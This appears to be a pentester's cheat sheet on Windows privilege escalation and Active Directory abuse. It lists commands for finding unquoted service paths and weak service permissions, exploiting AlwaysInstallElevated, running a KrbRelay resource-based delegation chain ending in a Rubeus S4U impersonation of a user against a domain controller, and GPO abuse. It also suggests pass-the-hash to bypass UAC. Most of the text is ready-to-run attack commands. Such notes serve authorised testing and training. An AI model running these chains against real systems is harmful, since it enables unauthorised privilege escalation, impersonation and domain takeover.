
before running winpeas, think of all the functions you can do with the cuurent user. maybe there is no bug or there is easier way like extract the administrator hash to bypass the UAC with pass the hash.

[Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)

Unquoted Service Paths
```sh 
wmic service get name, pathname

Get-Acl -Path "C:\Program Files\Vuln Services" | fl
or 
icacls "C:\Program Files"
```

---
check the service permistion 
```sh 
sc sdshow anaservice # SDDL format
(Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\anaservice").access
```

---
if
```sh
HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
```
any .msi will runs as SYSTME whatever who are ryou 

--- 
if you are in localadmins could bypass the UAC 


# Krbrelay 

1. create a computer: 
```bash 
StandIn.exe --computer evilcomputer --make 
```
2.  check a COM port:
```bash 
CheckPort.exe 
```
3. run krbRelay:
```bash
KrbRelay.exe -spn ldap/dc19.forest.lab -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd <evilcomputer-SID> -port 10
```

4. check the attribute:
```bash 
Get-DomainComputer -Identity 'win10' -Properties "msDS-AllowedToActOnBehalfOfOtherIdentity"
```

5. S4U attack:
```php
Rubeus.exe s4u /impersonateuser:hana /msdsspn:cifs/dc19.forest.lab /user:win10$ /ticket:<win10$-TGT-base64> /nowrap /opsec
```


# GPO abuse 
```bash
Get-GPO -All 
https://github.com/FSecureLABS/SharpGPOAbuse
```